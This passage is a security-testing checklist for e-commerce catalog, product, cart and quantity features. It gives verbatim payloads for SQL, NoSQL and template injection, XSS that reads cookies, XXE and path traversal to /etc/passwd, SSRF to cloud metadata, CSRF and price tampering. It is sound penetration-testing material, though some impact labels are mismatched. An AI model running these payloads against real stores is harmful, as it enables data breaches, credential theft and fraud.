# 4. E-Commerce Features — Checklist

Feature-area security **test cases** for “4. E-Commerce Features”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*222 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## ECOM-001 — SQL Injection in Product Listing
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Navigate to product catalog 2. Intercept request with category/sort parameters 3. Inject SQL payload 4. Observe response for SQL errors or data leakage

**Expected Result:** Application should use parameterized queries

**Payload Example:**

```
/products?category=1' OR '1'='1'-- or /products?sort=name;SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite / Havij

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-002 — NoSQL Injection in Product Filter
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Capture product filter request 2. Inject NoSQL operators 3. Check for unauthorized data access

**Expected Result:** Application should sanitize NoSQL queries

**Payload Example:**

```
{"category":{"$gt":""},price:{"$ne":null}}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** NoSQLMap / Burp Suite / MongoDB Compass

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## ECOM-003 — Blind SQL Injection via Time Delay
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Inject time-based payload in listing parameters 2. Measure response time 3. Confirm SQL injection exists

**Expected Result:** Application should prevent SQL injection

**Payload Example:**

```
/products?category=1' AND SLEEP(5)-- or 1'; WAITFOR DELAY '0:0:5'--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-004 — XSS via Product Search Reflection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Search for XSS payload 2. Check if search term reflected 3. Verify script execution

**Expected Result:** Search results should encode output

**Payload Example:**

```
/search?q=<script>alert('XSS')</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter / DOMPurify Bypass

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ECOM-005 — IDOR on Hidden Products Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Identify hidden/unpublished product IDs 2. Access directly via URL 3. View products not yet released

**Expected Result:** Hidden products should require authorization

**Payload Example:**

```
/api/products/hidden_product_id or /products/unreleased-item
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-006 — Price Information Disclosure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Capture product listing API response 2. Check for wholesale/cost price exposure 3. Analyze hidden fields

**Expected Result:** Only retail prices should be exposed

**Payload Example:**

```
Response containing cost_price or wholesale_price fields
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-007 — Pagination Parameter Manipulation
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Modify pagination parameters 2. Request negative or extremely large values 3. Check for errors or data leakage

**Expected Result:** Application should validate pagination bounds

**Payload Example:**

```
/products?page=-1&limit=999999 or offset=-100
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-008 — Category Traversal Attack
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Identify category parameter 2. Attempt path traversal 3. Access restricted categories

**Expected Result:** Category access should be validated

**Payload Example:**

```
/products?category=../admin/secret-products
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-009 — Cache Poisoning on Product Pages
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Identify cacheable product endpoints 2. Inject malicious headers 3. Poison cache for other users

**Expected Result:** Cache should not store manipulated responses

**Payload Example:**

```
X-Forwarded-Host: evil.com in product request
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## ECOM-010 — Product Enumeration via Response Differences
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Request existing and non-existing products 2. Compare response differences 3. Enumerate valid product IDs

**Expected Result:** Responses should be consistent

**Payload Example:**

```
Different status codes or error messages
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf / wfuzz

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## ECOM-011 — GraphQL Introspection Product Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Query GraphQL schema 2. Identify hidden product fields 3. Query sensitive product data

**Expected Result:** GraphQL should restrict introspection in production

**Payload Example:**

```
query { __schema { types { fields { name } } } }
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** GraphQL Voyager / Altair / Burp Suite

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## ECOM-012 — Mass Assignment on Product List Filters
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Add unexpected parameters to filter 2. Include admin-only filter options 3. Access restricted products

**Expected Result:** Filter parameters should be whitelisted

**Payload Example:**

```
/products?show_hidden=true&include_deleted=true
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Arjun / Param Miner

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ECOM-013 — XML External Entity in Product Feed
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Find XML product feed endpoint 2. Inject XXE payload 3. Extract server files

**Expected Result:** XML parser should disable external entities

**Payload Example:**

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## ECOM-014 — Server-Side Template Injection in Search
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Inject SSTI payload in search query 2. Check for template execution 3. Attempt code execution

**Expected Result:** Search input should not be processed as templates

**Payload Example:**

```
/search?q={{7*7}} or ${7*7} or <%= 7*7 %>
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap / SSTImap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## ECOM-015 — HTTP Parameter Pollution in Filters
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Catalog / Listing

**Test Steps:** 1. Send duplicate filter parameters 2. Check which value is processed 3. Bypass filter restrictions

**Expected Result:** Application should handle duplicates consistently

**Payload Example:**

```
/products?category=electronics&category=admin-only
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Param Miner

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ECOM-016 — Stored XSS in Product Description
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. Access product with admin privileges 2. Add XSS in description 3. View as customer 4. Verify execution

**Expected Result:** Product descriptions should be sanitized

**Payload Example:**

```
<img src=x onerror=alert(document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ECOM-017 — IDOR on Product Variant Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. View product variant 2. Modify variant ID 3. Access hidden or premium variants

**Expected Result:** Variant access should verify authorization

**Payload Example:**

```
/api/products/123/variants/premium_variant_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-018 — Price Manipulation via Variant Parameter
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. Select product variant 2. Intercept request 3. Modify variant_id to cheaper option 4. Complete purchase

**Expected Result:** Price should be validated server-side

**Payload Example:**

```
{"product_id":123,variant_id:"cheap_variant",quantity:1}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-019 — Hidden Variant Price Discovery
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. Query product API 2. Check for all variants in response 3. Find unreleased or special pricing

**Expected Result:** Only available variants should be exposed

**Payload Example:**

```
API response with internal_price or hidden_variants
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-020 — Variant SKU Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. Find SKU input field 2. Inject special characters 3. Check for injection vulnerabilities

**Expected Result:** SKU should be properly validated

**Payload Example:**

```
sku='; DROP TABLE products;-- or sku=<script>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / SQLMap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-021 — Product Image Path Traversal
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. Identify image URL pattern 2. Inject path traversal 3. Access server files

**Expected Result:** Image paths should be validated

**Payload Example:**

```
/images?path=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## ECOM-022 — SSRF via Product Image URL
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. Find image URL input 2. Provide internal URL 3. Check for SSRF

**Expected Result:** External URLs should be validated

**Payload Example:**

```
image_url=http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ECOM-023 — Race Condition on Limited Variants
**Test Category:** Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. Find limited stock variant 2. Send concurrent purchase requests 3. Exceed available quantity

**Expected Result:** Stock validation should be atomic

**Payload Example:**

```
Multiple simultaneous add-to-cart requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ECOM-024 — Negative Quantity for Variant
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. Add variant to cart 2. Modify quantity to negative 3. Check for credit or price reduction

**Expected Result:** Quantity should be validated as positive

**Payload Example:**

```
{"variant_id":123,quantity:-5}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-025 — Mass Assignment on Variant Creation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. Capture variant creation request 2. Add price/stock manipulation fields 3. Create underpriced variant

**Expected Result:** Only allowed fields should be accepted

**Payload Example:**

```
{"name":"Test",price:0.01,is_active:true,featured:true}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ECOM-026 — GraphQL Nested Query DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. Craft deeply nested GraphQL query 2. Request product with many variants 3. Exhaust server resources

**Expected Result:** Query depth should be limited

**Payload Example:**

```
{ product { variants { product { variants { ... } } } } }
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** GraphQL Voyager / Altair

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ECOM-027 — Product Specification Injection
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. Add product specification with XSS 2. View product page 3. Check for script execution

**Expected Result:** Specifications should be sanitized

**Payload Example:**

```
specification_value=<svg onload=alert('XSS')>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ECOM-028 — Variant Attribute Overflow
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Details / Variants

**Test Steps:** 1. Send extremely long variant attributes 2. Check for buffer overflow or DoS 3. Analyze server response

**Expected Result:** Attribute length should be limited

**Payload Example:**

```
attribute_value=A*100000
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ECOM-029 — Price Manipulation in Cart Request
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Add item to cart 2. Intercept request 3. Modify price parameter 4. Verify cart total

**Expected Result:** Price should never be accepted from client

**Payload Example:**

```
{"product_id":123,price:0.01,quantity:1}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-030 — Product ID Manipulation
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Add product to cart 2. Change product_id to premium item 3. Keep original price 4. Checkout

**Expected Result:** Product details should be fetched server-side

**Payload Example:**

```
{"product_id":"premium_product",price:1.00}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-031 — IDOR on Cart Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. View own cart 2. Modify cart_id or user_id 3. Access another user's cart

**Expected Result:** Cart should be tied to authenticated session

**Payload Example:**

```
GET /api/cart/victim_cart_id or /cart?user_id=victim
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-032 — IDOR on Cart Item Removal
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Remove item from own cart 2. Modify item_id 3. Remove item from another user's cart

**Expected Result:** Cart modifications should verify ownership

**Payload Example:**

```
DELETE /api/cart/items/victim_item_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-033 — CSRF on Add to Cart
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Create malicious page with add-to-cart form 2. Trick victim to visit 3. Items added to victim's cart

**Expected Result:** Add to cart should require CSRF token

**Payload Example:**

```
<img src="https://shop.com/cart/add?product_id=123">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ECOM-034 — CSRF on Cart Removal
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Create page triggering cart clear 2. Victim visits malicious page 3. Cart is emptied

**Expected Result:** Cart operations should verify CSRF token

**Payload Example:**

```
<img src="https://shop.com/cart/clear">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ECOM-035 — Race Condition on Add to Cart
**Test Category:** Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Find product with limited stock 2. Send concurrent add-to-cart requests 3. Exceed stock limit

**Expected Result:** Stock checks should be atomic

**Payload Example:**

```
100 parallel POST /cart/add requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ECOM-036 — Cart Session Fixation
**Test Category:** Session Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Obtain session ID 2. Send to victim 3. Victim adds items 4. Attacker accesses cart

**Expected Result:** Session should regenerate on cart creation

**Payload Example:**

```
PHPSESSID or cart_token manipulation
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## ECOM-037 — Cart Injection via Product Options
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Select product with custom options 2. Inject payload in option field 3. Add to cart and checkout

**Expected Result:** Custom options should be sanitized

**Payload Example:**

```
option_value=<script>stealCC()</script>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-038 — Negative Price via Cart Manipulation
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Add item to cart 2. Modify item price to negative 3. Check if total reduced 4. Checkout with credit

**Expected Result:** Prices should be validated server-side

**Payload Example:**

```
{"cart_item_id":123,unit_price:-50.00}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-039 — Hidden Product Addition
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Find hidden product ID 2. Add to cart via API 3. Purchase unreleased product

**Expected Result:** Only published products should be addable

**Payload Example:**

```
POST /cart/add {"product_id":"unreleased_product"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-040 — Cart Data Exposure in Response
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Add items to cart 2. Analyze full API response 3. Check for sensitive data leakage

**Expected Result:** Response should only contain necessary data

**Payload Example:**

```
Exposure of user_id/internal_ids/cost_prices
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-041 — Cart Persistence Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Add items to cart 2. Manipulate expiry timestamp 3. Prevent cart expiration

**Expected Result:** Cart expiry should be server-controlled

**Payload Example:**

```
{"cart_id":123,expires_at:"2099-12-31"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-042 — Cross-User Cart Merge
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Add to Cart / Remove from Cart

**Test Steps:** 1. Add items as guest 2. Login as different user 3. Check if carts merge incorrectly

**Expected Result:** Cart merge should verify ownership

**Payload Example:**

```
Cart merge vulnerability during authentication
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Multiple Accounts

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-043 — Quantity Integer Overflow
**Test Category:** Input Validation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cart Quantity Update

**Test Steps:** 1. Update cart quantity to max integer 2. Check for integer overflow 3. Get item for minimal price

**Expected Result:** Quantity should have reasonable limits

**Payload Example:**

```
{"quantity":9999999999999999999}
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ECOM-044 — Negative Quantity Exploit
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cart Quantity Update

